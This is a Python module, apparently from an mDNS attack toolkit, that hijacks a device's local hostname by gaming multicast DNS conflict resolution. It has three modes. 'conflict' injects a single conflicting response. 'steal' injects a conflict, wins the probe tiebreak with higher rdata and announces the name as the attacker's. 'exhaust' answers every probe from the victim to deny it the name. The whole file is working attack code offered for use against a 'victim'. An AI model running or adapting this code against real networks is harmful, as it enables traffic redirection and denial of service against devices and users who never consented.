"""
hijack.py - Name hijacking via conflict resolution gaming.

Forces a victim to give up its hostname by exploiting mDNS conflict detection.
The attacker sends a conflicting record with lexicographically-higher rdata
to win the tiebreak deterministically.

Methods:
  - conflict: Send a conflicting response to force re-probe, then win tiebreak
  - exhaust:  Continuously conflict every probe attempt (15+ conflicts = DoS)
"""

import time
import sys

sys.path.insert(0, __file__.rsplit("/", 2)[0])
from mdns_core import (make_mdns_socket, send_mdns, recv_mdns, parse_packet,
                       build_response, build_probe, DNSPacket, QR_RESPONSE,
                       rdata_a, A, CACHE_FLUSH, IN, ANY)


def conflict_once(name: str, our_ip: str, iface: str | None = None, ttl: int = 120):
    """
    Send a single conflicting response to force the current owner of `name`
    into re-probing. Use an IP that is lexicographically higher to win the
    subsequent tiebreak.

    Example: if victim has 192.168.1.10, use 192.168.1.250.
    """
    sock = make_mdns_socket(iface)

    # Send a response claiming the name with our higher IP
    pkt = build_response(name, A, rdata_a(our_ip), ttl=ttl, cache_flush=True)
    send_mdns(sock, pkt)
    print(f"[+] Conflict injected: {name} A -> {our_ip}")
    print(f"    Victim must re-probe. Our rdata should be lexicographically higher to win.")
    sock.close()


def exhaust_probes(name: str, our_ip: str, iface: str | None = None,
                   duration: int = 60):
    """
    Monitor for probes for `name` and immediately respond with a conflicting
    record. This prevents the victim from ever successfully claiming the name.

    After 15 failed probes (RFC 6762), the victim backs off to 5s intervals.
    We keep conflicting to maintain denial.
    """
    sock = make_mdns_socket(iface)
    target = name.lower().rstrip(".") + "."

    print(f"[*] Probe exhaustion: blocking all probes for {name}")
    print(f"[*] Using IP {our_ip} (must be lexicographically > victim's IP)")
    print(f"[*] Duration: {duration}s")

    start = time.time()
    conflicts_sent = 0

    try:
        while time.time() - start < duration:
            result = recv_mdns(sock, timeout=0.5)
            if result is None:
                continue
            data, (src_ip, src_port) = result
            pkt = parse_packet(data)
            if not pkt or pkt["is_response"]:
                continue

            # Look for probes (queries with authority section) or any query for our name
            is_probe = False
            for q in pkt["questions"]:
                if q["name"].lower() == target:
                    is_probe = True
                    break
            for auth in pkt["authority"]:
                if auth["name"].lower() == target:
                    is_probe = True
                    break

            if is_probe:
                # Respond with conflicting record
                resp = build_response(name, A, rdata_a(our_ip), ttl=120, cache_flush=True)
                send_mdns(sock, resp)
                conflicts_sent += 1
                print(f"  [{conflicts_sent}] Probe from {src_ip} -> conflicted")

                # Also send a probe of our own to win simultaneous tiebreaking
                probe = build_probe(name, A, rdata_a(our_ip))
                send_mdns(sock, probe)
    except KeyboardInterrupt:
        pass

    print(f"\n[*] Done. Sent {conflicts_sent} conflict responses in {time.time()-start:.0f}s")
    sock.close()


def steal_name(name: str, our_ip: str, iface: str | None = None):
    """
    Full name steal: conflict the existing owner, then claim via probing.

    1. Send conflict to force victim into re-probing
    2. Win the probe tiebreak with higher rdata
    3. Announce the name as ours
    """
    sock = make_mdns_socket(iface)
    target = name.lower().rstrip(".") + "."

    print(f"[*] Stealing {name} -> {our_ip}")

    # Step 1: Inject conflict
    print(f"[+] Step 1: Injecting conflict")
    resp = build_response(name, A, rdata_a(our_ip), ttl=120, cache_flush=True)
    send_mdns(sock, resp)
    time.sleep(0.3)

    # Step 2: Send our probes (3 probes, 250ms apart per RFC)
    print(f"[+] Step 2: Probing (3x 250ms)")
    for i in range(3):
        probe = build_probe(name, A, rdata_a(our_ip))
        send_mdns(sock, probe)
        time.sleep(0.25)

    # Step 3: Listen for counter-probes and conflict them
    print(f"[+] Step 3: Defending against counter-probes (2s window)")
    deadline = time.time() + 2.0
    while time.time() < deadline:
        result = recv_mdns(sock, timeout=0.25)
        if result is None:
            continue
        data, (src_ip, _) = result
        pkt = parse_packet(data)
        if not pkt:
            continue
        for auth in pkt.get("authority", []):
            if auth["name"].lower() == target:
                # Re-assert our claim
                send_mdns(sock, resp)
                print(f"  [!] Counter-probe from {src_ip} -> re-conflicted")

    # Step 4: Announce
    print(f"[+] Step 4: Announcing ownership")
    announcement = DNSPacket(flags=QR_RESPONSE)
    announcement.add_answer(name, A, rdata_a(our_ip), ttl=120, rclass=CACHE_FLUSH)
    send_mdns(sock, announcement.build())
    time.sleep(1)
    send_mdns(sock, announcement.build())  # second announcement per RFC

    print(f"[+] Name stolen: {name} -> {our_ip}")
    sock.close()


def run(name: str, ip: str, mode: str = "steal", iface: str | None = None,
        duration: int = 60):
    if mode == "steal":
        steal_name(name, ip, iface)
    elif mode == "conflict":
        conflict_once(name, ip, iface)
    elif mode == "exhaust":
        exhaust_probes(name, ip, iface, duration)
    else:
        print(f"Unknown mode: {mode}")
